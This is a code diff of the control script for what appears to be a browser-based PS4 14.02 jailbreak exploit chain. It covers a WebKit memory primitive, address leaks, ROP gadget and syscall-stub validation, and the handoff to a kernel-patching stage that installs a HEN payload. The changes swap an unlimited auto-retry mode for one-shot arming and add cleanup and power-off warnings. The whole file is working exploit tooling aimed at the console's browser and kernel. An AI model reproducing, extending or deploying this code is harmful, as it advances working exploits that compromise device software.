@@ -1,19 +1,15 @@
-import { establishPrimitive, releasePrimitiveState } from "./core.js?v=hen1402r16";
-import { installWindowP, pairStatus, releaseWindowP } from "./mem.js?v=hen1402r16";
-import { int64 } from "./int64.js?v=hen1402r16";
-import { offsetsFor, PS4 } from "./ps4_offsets.js?v=hen1402r16";
+import { establishPrimitive, releasePrimitiveState } from "./core.js?v=hen1402r17";
+import { installWindowP, pairStatus, releaseWindowP } from "./mem.js?v=hen1402r17";
+import { int64 } from "./int64.js?v=hen1402r17";
+import { offsetsFor, PS4 } from "./ps4_offsets.js?v=hen1402r17";
 
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
 let passCount = 0,
   failCount = 0;
-let armedEver = false;
 const params = new URLSearchParams(location.search);
-const UNLIMITED_MODE = (function () {
-  try { return localStorage.getItem("hen-1402-unlimited") === "1"; }
-  catch (_) { return false; }
-})();
+let kernelStageEntered = false;
 
 /* The retry notice. Two things lead here: the chain throws, or it stalls
    without a word. The watchdog covers the second case. It cannot fire when
@@ -32,41 +28,32 @@ function showNotice(text) {
   } catch (e) {}
 }
 
+function showSuccess(text) {
+  try {
+    let box = document.getElementById("henSuccess");
+    if (!box) {
+      box = document.createElement("div");
+      box.id = "henSuccess";
+      box.style.cssText =
+        "position:fixed;top:72px;left:50%;transform:translateX(-50%);" +
+        "z-index:9999;width:80%;max-width:760px;padding:16px 18px;" +
+        "border:2px solid #35e6a5;" +
+        "background:#073c2e;color:#d9fff1;font:700 20px/1.4 Arial,sans-serif;" +
+        "border-radius:8px";
+      (document.getElementById("wrap") || document.body).appendChild(box);
+    }
+    box.textContent = text;
+    document.body.classList.remove("fail");
+  } catch (_) {}
+}
+
 function showRetry() {
   if (retryShown) return;
   retryShown = true;
-  showNotice("exploit failed - please retry (reopen browser)");
+  showNotice("No progress was recorded. Do not start another attempt on this boot; fully power off the PS4 first.");
 }
 
-let unlimitedRetryScheduled = false;
-function scheduleUnlimitedShot(reason) {
-  if (!UNLIMITED_MODE || unlimitedRetryScheduled) return false;
-  unlimitedRetryScheduled = true;
-  const button = document.createElement("button");
-  button.textContent = "Run another HEN shot now";
-  button.style.cssText =
-    "display:block;margin:14px 0;padding:12px 18px;font-size:18px;" +
-    "background:#85e1c7;color:#07141a;border:0;border-radius:7px";
-  let fired = false;
-  button.onclick = function () {
-    if (fired) return;
-    fired = true;
-    const nonce = String(Date.now()) + "-" + String(Math.random()).slice(2);
-    try {
-      sessionStorage.setItem("hen-1402-core-tab-token", nonce);
-      localStorage.setItem("hen-1402-core-attempted", nonce + ":started");
-    } catch (_) {}
-    const next = new URL(location.href);
-    next.searchParams.set("run", nonce);
-    location.replace(next.href);
-  };
-  (outEl || document.body).appendChild(button);
-  showNotice("Unlimited mode: another HEN shot starts automatically in 2 seconds (" + reason + ").");
-  setTimeout(function () { try { button.click(); } catch (_) {} }, 2000);
-  return true;
-}
-
-const WATCHDOG_MS = 45000;
+const WATCHDOG_MS = 90000;
 const watchdog = setInterval(function () {
   if (Date.now() - lastMark > WATCHDOG_MS) {
     try { clearInterval(watchdog); } catch (e) {}
@@ -74,32 +61,11 @@ const watchdog = setInterval(function () {
   }
 }, 5000);
 
-/* The referrer guard. The console's browser restores the page it had open
-   last. If that was the armed chain it would run again with nobody in front
-   of the screen, so arming requires a step from this folder's landing page.
-   The guard lives here rather than in the server, so it holds however the
-   files are served. */
-const FROM_LANDING = (function () {
-  try {
-    if (!document.referrer) return false;
-    const r = new URL(document.referrer);
-    if (r.origin !== location.origin) return false;
-    const cameFrom = r.pathname.replace(/[^/]*$/, "");
-    const here = location.pathname.replace(/[^/]*$/, "");
-    if (cameFrom !== here) return false;
-    const file = r.pathname.slice(cameFrom.length);
-    return file === "" || file === "index.html";
-  } catch (e) {
-    return false;
-  }
-})();
-
 const HANDOFF_OK = (function () {
   if (params.get("afterglow") !== "run") return false;
   const run = params.get("run") || "";
   if (!/^[0-9]+-[0-9]+$/.test(run)) return false;
   try {
-    if (UNLIMITED_MODE) return true;
     const good = sessionStorage.getItem("hen-1402-core-tab-token") === run &&
       localStorage.getItem("hen-1402-core-attempted") === run + ":started";
     sessionStorage.removeItem("hen-1402-core-tab-token");
@@ -111,13 +77,11 @@ const HANDOFF_OK = (function () {
 /* A page the browser restored must do nothing at all. Until this sat here,
    the refusal came only after the WebKit stage had already run in full --
    harmless to the kernel, but pointless work on a page nobody asked to run.
-   Send it back to the start page instead; from there the ordinary route
-   takes over, autostart included, and it arms with a proper referrer and a
-   visible countdown. A probe is exempt: it fires nothing and patches
-   nothing. */
+   Send it back to the start page instead, where another explicit button
+   press creates a fresh same-tab token. */
 const SENT_HOME = (function () {
   const want = params.get("afterglow");
-  if (!want || want === "probe" || HANDOFF_OK) return false;
+  if (!want || HANDOFF_OK) return false;
   try {
     /* Pin the page to the .fail look: the message lives in #msg, which is
        hidden in log mode, and the URL decides whether log mode is on. */
@@ -125,7 +89,7 @@ const SENT_HOME = (function () {
     const msgEl = document.getElementById("msg");
     if (msgEl) {
       msgEl.textContent =
-        "Open the start page once to enable unlimited HEN attempts.";
+        "Open the start page to arm one clean-boot core HEN attempt.";
     }
   } catch (e) {}
   /* replace(), not assign(): the refused page must not stay in the history,
@@ -275,7 +239,7 @@ function finishUI(ok) {
   if (m)
     m.textContent = ok
       ? "DONE"
-      : armedEver
+      : kernelStageEntered
         ? "Restart your console"
         : "Refresh the page and run again";
   document.body.className = ok ? "done" : "fail";
@@ -370,7 +334,6 @@ const keepAlive = [];
 let mainMf = null,
   mainOrig = null,
   mainArmed = false;
-let pinRestore = null;
 
 function releaseWebKitHeap(p) {
   let pivotRestored = !mainArmed;
@@ -419,6 +382,19 @@ let allDone = false,
 (async function () {
   if (SENT_HOME) return;
   let p = null;
+
+  function releaseBeforeKernel(reason) {
+    let released = null;
+    try { released = releaseWebKitHeap(p); } catch (_) {}
+    const ok = !!released && released.pivotRestored === true &&
+      released.coreReleased === true;
+    mark(ok ? "WEBKIT-HEAP-RELEASED" : "WEBKIT-HEAP-RELEASE-FAILED",
+      "pre-kernel=true reason=" + reason +
+      " pivot=" + (!!released && released.pivotRestored === true) +
+      " core=" + (!!released && released.coreReleased === true));
+    if (ok) p = null;
+    return ok;
+  }
 
   const opened = [];
   let closeFd = null;
@@ -530,6 +506,7 @@ let allDone = false,
       installWindowP(carrier, { promote: false });
 
       const pp = window.p;
+      p = pp;
 
       const cell = pp.leakval(Math.expm1);
 
@@ -576,8 +553,10 @@ let allDone = false,
         primitiveOk ? "PASS" : "FAIL",
       );
 
+      const primitiveReleased = releaseBeforeKernel("primitive-only complete");
+
       allDone = true;
-      finishUI(primitiveOk);
+      finishUI(primitiveOk && primitiveReleased);
       return;
     }
 
@@ -620,14 +599,13 @@ let allDone = false,
     )
       return;
 
-    // With its own kernel stage, afterglow carries its own patch set
-    // (patchset.bin) and picks the payload from ?mode. The host's names for
-    // these never applied here.
+    // The 14.02 Afterglow route applies its verified embedded patch windows
+    // and loads exactly the pinned core-HEN binary.
     const KPATCH_FILE = OWN_KERNEL_STAGE
-      ? "patchset.bin (afterglow)"
+      ? "embedded Afterglow 14.02 patch windows"
       : "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = OWN_KERNEL_STAGE
-      ? "hen.bin|goldhen.bin (per ?mode)"
+      ? "hen-1402-core.bin"
       : off.payload || "payload.bin";
     const needPatch = OWN_KERNEL_STAGE ? [] : ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
@@ -682,67 +660,6 @@ let allDone = false,
         PAYLOAD_FILE +
       " src=ps4_offsets.js",
     );
-
-    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
-    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
-    // phase -- no kernel .data/.text has been touched yet, so reloading and
-    // retrying is safe. The counter lives in sessionStorage so it survives
-    // the reload and is cleared the moment the read phase succeeds, so a
-    // later manual run always starts fresh. NEVER call retryBenign() after a
-    // kernel write: a reload would re-enter with the kernel already modified.
-    // A hard KP (a total reclaim miss that faults inside the cancel walk)
-    // cannot be caught here and still needs a reboot -- this only recovers
-    // the benign, detectable misses.
-    const retryArg = parseInt(params.get("retry") || "", 10);
-    const RETRY_MAX = params.get("afterglow") === "run" ? 0 :
-      (Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4);
-    const RETRY_KEY = "jb1352-read-retry";
-    const retryCount = () => {
-      try {
-        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
-        return Number.isFinite(v) && v > 0 ? v : 0;
-      } catch (e) {
-        return 0;
-      }
-    };
-    const clearRetry = () => {
-      try {
-        sessionStorage.removeItem(RETRY_KEY);
-      } catch (e) {}
-    };
-    const retryBenign = (why) => {
-      const n = retryCount();
-      if (n >= RETRY_MAX) {
-        mark(
-          "AUTO-RELOAD-GIVEUP",
-          "why=" + why + " reloads=" + n + " -- reboot and try again",
-        );
-        return false;
-      }
-      let stored = -1;
-      try {
-        sessionStorage.setItem(RETRY_KEY, String(n + 1));
-        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
-      } catch (e) {
-        stored = -1;
-      }
-      if (stored !== n + 1) {
-        mark(
-          "AUTO-RELOAD-NO-STORAGE",
-          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
-        );
-        return false;
-      }
-      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
-      setTimeout(() => {
-        try {
-          location.reload();
-        } catch (e) {}
-      }, 400);
-      return true;
-    };
-    if (retryCount() > 0)
-      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);
 
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
@@ -805,8 +722,10 @@ let allDone = false,
         aligned(webkitBase) && aligned(libkernelBase),
         "",
       )
-    )
+    ) {
+      releaseBeforeKernel("module base validation failed");
       return;
+    }
 
     const G = {};
     const GAD = [
@@ -856,8 +775,10 @@ let allDone = false,
         gated === GAD.length,
         gated + "/" + GAD.length,
       )
-    )
+    ) {
+      releaseBeforeKernel("gadget validation failed");
       return;
+    }
     const argGadget = [
       G.POP_RDI_RET,
       G.POP_RSI_RET,
@@ -898,8 +819,10 @@ let allDone = false,
     }
     mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
     const miss = Object.keys(SYS).filter((k) => !stubAddr.has(SYS[k]));
-    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(",")))
+    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(","))) {
+      releaseBeforeKernel("syscall stub validation failed");
       return;
+    }
 
     function bufAddr(ab) {
       const c = p.leakval(ab);
@@ -1051,24 +974,27 @@ let allDone = false,
       let terminalReleaseAttempted = false;
       let terminalReleaseResult = null;
       let henInstalled = false;
-      /* Arming requires a step from the landing page. A probe
-         (afterglow=probe) fires no trigger and patches nothing, so a restored
-         page may run that. */
+      /* Arming requires the exact same-tab token created by the landing-page
+         button; restored or hand-edited launch URLs do not enter this block. */
       try {
-        const ag = await import("./afterglow-g.js?v=hen1402r16");
+        const ag = await import("./afterglow-g.js?v=hen1402r17");
         // Exactly what afterglow reaches for, counted rather than guessed.
         const agCtx = {
           p: p, callAddr: callAddr, bufAddr: bufAddr, errno: errno,
           params: params, keepAlive: keepAlive, mark: mark, state: state,
           firmware: fwKey,
-          unlimited: UNLIMITED_MODE,
           libkernelBase: libkernelBase, webkitBase: webkitBase,
           stubAddr: stubAddr, off: off,
           prepareMany: prepareMany, runPrepared: runPrepared,
+          markKernelStageEntered: function () {
+            kernelStageEntered = true;
+          },
           releaseAfterPayloadStart: function (status) {
             if (terminalReleaseAttempted) return terminalReleaseResult;
             if (!status || status.payload !== true || status.defused !== true)
               return { pivotRestored: false, coreReleased: false };
+            payloadRunning = true;
+            if (status.installed === true) henInstalled = true;
             terminalReleaseAttempted = true;
             try {
               terminalReleaseResult = releaseWebKitHeap(p);
@@ -1096,10 +1022,28 @@ let allDone = false,
             return terminalReleaseResult;
           },
         };
-        if (params.get("afterglow") === "probe") {
-          ag.probeAfterglow(agCtx);
-        } else {
+        {
           const result = await ag.runAfterglow(agCtx);
+          if (!kernelStageEntered) {
+            const released = releaseBeforeKernel("Afterglow preflight stopped");
+            const installedBeforeShot = !!result && result.installed === true;
+            const unknownBeforeShot = !!result && result.unknown === true;
+            allDone = true;
+            try { clearInterval(watchdog); } catch (_) {}
+            if (installedBeforeShot && released) {
+              showSuccess("Core HEN completion marker was already present. No kernel shot or second installer ran.");
+            } else if (installedBeforeShot) {
+              showNotice("The core HEN completion marker is present, but browser cleanup was not verified. Fully power off before another attempt.");
+            } else if (unknownBeforeShot) {
+              showNotice("No new kernel shot ran, but the existing kernel state is unknown. Fully power off the PS4 before another attempt.");
+            } else if (released) {
+              showNotice("The preflight stopped before any kernel shot and released its browser memory. Reopen the start page to try again.");
+            } else {
+              showNotice("The preflight stopped before any kernel shot, but browser cleanup was not verified. Fully power off before another attempt.");
+            }
+            finishUI(installedBeforeShot && released);
+            return;
+          }
           const threadStarted = !!result &&
             (result.threadStarted === true || result.payload === true);
           henInstalled = !!result && result.installed === true;
@@ -1110,16 +1054,19 @@ let allDone = false,
               : "corrected HEN thread did not start");
           payloadRunning = threadStarted;
           cleanupSafe = henInstalled && result.defused === true;
+          if (henInstalled)
+            showSuccess("Core HEN installer returned success. No second installer thread was started.");
         }
       } catch (agError) {
         mark("AG-FAIL", agError && agError.message ? agError.message : String(agError));
+        if (!kernelStageEntered) throw agError;
       }
       allDone = true;
       mark("SHOT-END", henInstalled
-        ? "HEN completion marker confirmed; HEN is installed on this boot"
+        ? "core HEN installer returned zero and wrote its completion marker"
         : payloadRunning
-          ? "pthread_create returned; HEN status unconfirmed"
-          : "No payload thread confirmed; preparing another shot");
+          ? "pthread_create returned; installer status unconfirmed -- no retry on this boot"
+          : "No payload thread confirmed; no automatic retry after kernel-stage entry");
       if (cleanupSafe) {
         const released = terminalReleaseAttempted
           ? terminalReleaseResult
@@ -1142,9 +1089,10 @@ let allDone = false,
         finishUI(true);
         return;
       }
-      finishUI(payloadRunning);
-      if (!henInstalled && !payloadRunning)
-        scheduleUnlimitedShot("the exploit did not start HEN");
+      finishUI(henInstalled);
+      try { clearInterval(watchdog); } catch (_) {}
+      if (!henInstalled)
+        showNotice("The core HEN installer was not confirmed. Fully power off the PS4 before another attempt.");
       return;
     }
     mark("JB-END", "afterglow is the kernel stage -- without afterglow= nothing runs here");
@@ -1154,10 +1102,17 @@ let allDone = false,
   } catch (eOuter) {
     try { mark("JB-THREW", (eOuter && eOuter.message) || String(eOuter)); } catch (e) {}
     try { clearInterval(watchdog); } catch (e) {}
-    // Put it on the television. A failure in the WebKit stage touched
-    // NOTHING -- no apm unit spent, no kernel byte written. Reopening the
-    // browser is enough; rebooting the console would waste a cycle.
-    showRetry();
-    scheduleUnlimitedShot("the browser stage stopped");
+    if (!kernelStageEntered) {
+      let released = null;
+      try { released = releaseWebKitHeap(p); } catch (_) {}
+      if (released && released.pivotRestored && released.coreReleased) {
+        p = null;
+        showNotice("The browser stage stopped and its memory was released. Reopen the start page to try again.");
+      } else {
+        showNotice("Browser cleanup could not be verified. Fully power off the PS4 before another attempt.");
+      }
+    } else {
+      showNotice("The attempt stopped after the kernel stage began. Fully power off the PS4 before another attempt.");
+    }
   }
 })();
